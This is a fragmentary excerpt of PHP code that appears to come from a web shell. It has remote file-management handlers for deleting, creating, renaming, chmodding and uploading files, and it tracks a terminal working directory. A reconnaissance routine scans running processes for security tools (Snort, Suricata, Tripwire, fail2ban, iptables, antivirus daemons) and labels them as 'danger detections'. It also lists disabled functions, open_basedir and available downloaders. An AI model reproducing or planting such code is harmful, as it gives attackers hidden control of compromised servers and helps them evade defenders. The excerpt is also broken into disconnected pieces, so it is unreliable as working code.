...
$danger_detections=array('WAF'=>array(),'HIDS/IPS'=>array(),'Antivirus'=>array(),'Hardening'=>array(),'Firewall'=>array(),'Log Scanners'=>array());
...
$generic_keywords=array('HIDS/IPS'=>array('snort','suricata','tripwire','aide','bro','zeek'),'Firewall'=>array('iptables','ufw','firewalld','ipfw','shorewall','portsentry'),'Log Scanners'=>array('fail2ban','denyhosts','logwatch','logcheck'),'Antivirus'=>array('avg','kav','nod32','bdcored','uvscan','sav','drwebd','sophos'));
if($ps_output){
...
$dirs[]=array('name'=>'..','type'=>'dir','size'=>'-','owner'=>'N/A','perms'=>substr(sprintf('%o',@fileperms($parentPath)),-4),'perm_color'=>$permColorParent,'icon_class'=>'fa-solid fa-arrow-turn-up fa-rotate-270','icon_color'=>'#FFBF00','modified'=>date("Y-m-d H:i:s",@filemtime($parentPath)),'full_path'=>$parentPath);
}
...
$entry=array('name'=>$item,'type'=>$isDir?'dir':'file','size'=>$size,'owner'=>$owner_info,'perms'=>$permsOctal,'perm_color'=>$permColor,'icon_class'=>$icon_class,'icon_color'=>$icon_color,'modified'=>date("Y-m-d H:i:s",@filemtime($itemPath)),'full_path'=>$itemPath);
...
$response=array('status'=>'success','files'=>array_merge($dirs,$files_list),'path'=>htmlspecialchars($realPath),'breadcrumbs'=>$breadcrumbs_data,'drives'=>$drives,'ds'=>DIRECTORY_SEPARATOR);
@chdir($term_cwd_backup);
echo json_encode($response);
exit;
break;
...
if($itemPath){
if(is_file($itemPath)){
$response=@unlink($itemPath)?array('status'=>'success','message'=>'File deleted: '.htmlspecialchars(basename($itemPath))):array('message'=>'[Error] Failed to delete file. Check permissions.');
...
$response=deleteDirectoryRecursive($itemPath)?array('status'=>'success','message'=>'Directory deleted: '.htmlspecialchars(basename($itemPath))):array('message'=>'[Error] Failed to delete directory. Check permissions.');
}else{
...
if($is_folder){
$response=@mkdir($basePath.DIRECTORY_SEPARATOR.$name,0755)?array('status'=>'success','message'=>'Folder created: '.htmlspecialchars($name)):array('message'=>'[Error] Could not create folder. Check permissions.');
}else{
$response=@touch($basePath.DIRECTORY_SEPARATOR.$name)?array('status'=>'success','message'=>'File created: '.htmlspecialchars($name)):array('message'=>'[Error] Could not create file. Check permissions.');
}
}
break;
case 'rename_item':
...
$response=@rename($oldPath,$newPath)?array('status'=>'success','message'=>'Item renamed to '.htmlspecialchars($newName)):array('message'=>'[Error] Failed to rename. Check permissions.');
}
}
}else{
...
$response=@chmod($path,$permsOct)?array('status'=>'success','message'=>'Permissions changed for '.htmlspecialchars(basename($path)).' to '.sprintf('%04o',$permsOct)):array('message'=>'[Error] Failed to change permissions. Check ownership/permissions.');
}
}else{
...
$upload_errors=array(UPLOAD_ERR_INI_SIZE=>'The uploaded file exceeds the upload_max_filesize directive in php.ini.',UPLOAD_ERR_FORM_SIZE=>'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',UPLOAD_ERR_PARTIAL=>'The uploaded file was only partially uploaded.',UPLOAD_ERR_NO_TMP_DIR=>'Missing a temporary folder.',UPLOAD_ERR_CANT_WRITE=>'Failed to write file to disk.',UPLOAD_ERR_EXTENSION=>'A PHP extension stopped the file upload.',);
...
if($k==='Danger'){
echo $v;
}elseif(in_array($k,array('Network Interfaces (attempt)','Disabled Functions','Open Basedir','Include Path','Session Save Path','Downloaders','Useful'))){
